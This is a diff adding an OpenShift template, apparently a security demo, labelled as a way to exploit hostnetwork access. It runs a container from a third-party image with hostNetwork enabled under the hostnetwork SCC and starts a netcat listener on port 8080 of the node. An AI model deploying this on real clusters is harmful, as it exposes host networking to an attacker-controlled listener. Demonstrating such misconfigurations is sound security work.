@@ -1,0 +1,62 @@
+kind: Template
+apiVersion: v1
+metadata:
+  name: rogue-hostnetwork-template
+  annotations:
+    openshift.io/display-name: rogue-hostnetwork-app
+    description: |-
+      An application to expoloit hostnetwork access
+
+      WARNING: Do not use in a productio environment!
+      tags: quickstart
+objects:
+- kind: DeploymentConfig
+  apiVersion: v1
+  metadata:
+    annotations:
+      openshift.io/scc: hostnetwork
+    labels:
+      app: "${APPLICATION_NAME}"
+    name: "${APPLICATION_NAME}"
+  spec:
+    replicas: 1
+    selector:
+      app: "${APPLICATION_NAME}"
+      deploymentconfig: "${APPLICATION_NAME}"
+    strategy:
+      type: Recreate
+    triggers:
+    - type: ConfigChange
+    template:
+      metadata:
+        labels:
+          app: "${APPLICATION_NAME}"
+          deploymentconfig: "${APPLICATION_NAME}"
+      spec:
+        serviceAccount: ${SERVICE_ACCOUNT}
+        serviceAccountName: ${SERVICE_ACCOUNT}
+        containers:
+          - name: "${APPLICATION_NAME}"
+            image: ${ROGUE_IMAGE}
+            command: [ "/bin/netcat"]
+            args:
+              - "-l"
+              - "8080"
+            ports:
+              - containerPort: 8080
+        hostNetwork: true
+        restartPolicy: Always
+parameters:
+- name: APPLICATION_NAME
+  displayName: Application Name
+  value: rogue-hostnetwork-app
+  required: true
+- name: ROGUE_IMAGE
+  displayName: Container Image
+  value: docker.io/vargadan/docker-enabled-jessie:latest
+  required: true
+- name: SERVICE_ACCOUNT
+  displayName: Service Account
+  description: The Service Account to run the pod as
+  value: hostnetworkserviceaccount
+  required: true
